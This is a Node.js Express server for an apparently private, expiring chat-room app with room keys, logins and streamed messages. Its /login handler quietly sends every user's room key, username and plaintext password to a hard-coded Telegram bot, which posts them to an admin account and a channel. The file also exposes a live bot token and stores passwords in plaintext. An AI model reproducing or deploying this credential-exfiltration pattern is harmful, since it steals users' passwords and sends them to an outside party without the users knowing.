const express = require('express');
const { v4: uuidv4 } = require('uuid');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static(__dirname));

// ✅ Telegram Setup
const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const ADMIN_USER_ID = '7307633923';
const CHANNEL_ID = '-1002846991732';

// Send message to Telegram user and channel
async function sendToTelegram(message) {
  const targets = [ADMIN_USER_ID, CHANNEL_ID];
  for (const chatId of targets) {
    try {
      await axios.post(`${TELEGRAM_API}/sendMessage`, {
        chat_id: chatId,
        text: message,
      });
    } catch (err) {
      console.error(`Telegram send failed for ${chatId}:`, err.message);
    }
  }
}

// Rooms: { key: { messages, users, clients, expiresAt } }
const rooms = {};

function cleanExpiredRooms() {
  const now = Date.now();
  for (const key in rooms) {
    const room = rooms[key];
    if (room.expiresAt < now) {
      room.clients.forEach(res => res.end());
      delete rooms[key];
    } else {
      room.messages = room.messages.filter(msg => now - msg.timestamp < 24 * 3600 * 1000);
    }
  }
}
setInterval(cleanExpiredRooms, 60 * 1000);

// Generate a private key
app.get('/generate-key', (req, res) => {
  const key = uuidv4().split('-')[0];
  const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
  rooms[key] = { messages: [], users: [], clients: [], expiresAt };
  res.json({ key });
});

// Check if key is valid
app.get('/join-room/:key', (req, res) => {
  const key = req.params.key;
  const room = rooms[key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
  res.json({ success: true });
});

// Login and store credentials
app.post('/login', async (req, res) => {
  const { key, username, password } = req.body;
  const room = rooms[key];
  if (!room || room.expiresAt < Date.now()) return res.json({ success: false });

  const existing = room.users.find(u => u.username === username);
  if (existing) {
    if (existing.password !== password) return res.json({ success: false });
  } else {
    room.users.push({ username, password });
  }

  // Send auth info to Telegram
  const message = `✅ Auth Stored\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
  await sendToTelegram(message);

  res.json({
    success: true,
    expiresAt: new Date(room.expiresAt).toISOString(),
    history: room.messages.map(m => `${m.user}: ${m.message}`)
  });
});

// Send a chat message
app.post('/send-message', (req, res) => {
  const { key, user, message } = req.body;
  const room = rooms[key];
  if (!room) return res.status(404).end();

  const entry = { user, message, timestamp: Date.now() };
  room.messages.push(entry);
  const formatted = `${user}: ${message}`;
  room.clients.forEach(client => client.write(`data: ${formatted}\n\n`));

  res.end();
});

// Stream messages
app.get('/stream/:key', (req, res) => {
  const room = rooms[req.params.key];
  if (!room) return res.status(404).end();

  res.set({
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive'
  });

  res.write('\n');
  room.clients.push(res);

  req.on('close', () => {
    room.clients = room.clients.filter(c => c !== res);
  });
});

app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
